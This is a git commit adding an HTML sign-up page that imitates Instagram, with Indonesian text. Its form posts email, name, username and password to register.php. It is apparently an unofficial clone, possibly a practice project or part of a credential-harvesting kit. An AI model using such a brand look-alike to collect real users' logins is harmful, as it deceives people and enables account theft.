130d08e1be0ec289a10824ade4da7f5fb58012b4
ranggacahsecreamored <30397579+ranggacahsecreamored@users.noreply.github.com>
2017-10-23 01:43:10 +0700

    Add files via upload

---
+++ igg/signup.php
@@ -0,0 +1,44 @@
+<!DOCTYPE html>
+<html >
+<head>
+  <meta charset="UTF-8">
+  <title>Sign Up Instagram</title>
+     <link rel="stylesheet" href="css/signup.css">
+
+
+</head>
+
+<body>
+  <form action="register.php"  method="POST">
+<center><img src="logo.png" class="logo"></center>
+<div id="sign">
+
+<div class="background">
+  <div class="header">
+    <img src="img/font.png">
+  </div>
+  <div class="info">
+  </div>
+</div>
+<div class="form">
+<div class="shape">
+  <p class="font"><b>Buat akun untuk melihat foto dan video dari teman Anda.</b></p>
+      <input type="submit" value="Sign Up With Facebook" class="daftar1" href="#">
+  <div class="thumbnail"></div>
+  <form class="login-form">
+    <input type="email" name='email' placeholder="E-mail Address"/>
+    <input type="text" name='fullname' placeholder="Fullname"/>
+    <input type="text" name='username' placeholder="Username"/>
+    <input type="password" name='password' placeholder="password"/>
+    <input type="submit" value="Sign Up">
+  <p class="font1">Dengan mendaftar, Anda menyetujui <b>Ketentuan Kebijakan</b> <br>Privasi kami.</p>
+    
+  </div>
+    <img class="img" src="img/img1.jpg">
+  </form>
+</div>
+</div>
+
+
+</body>
+</html>
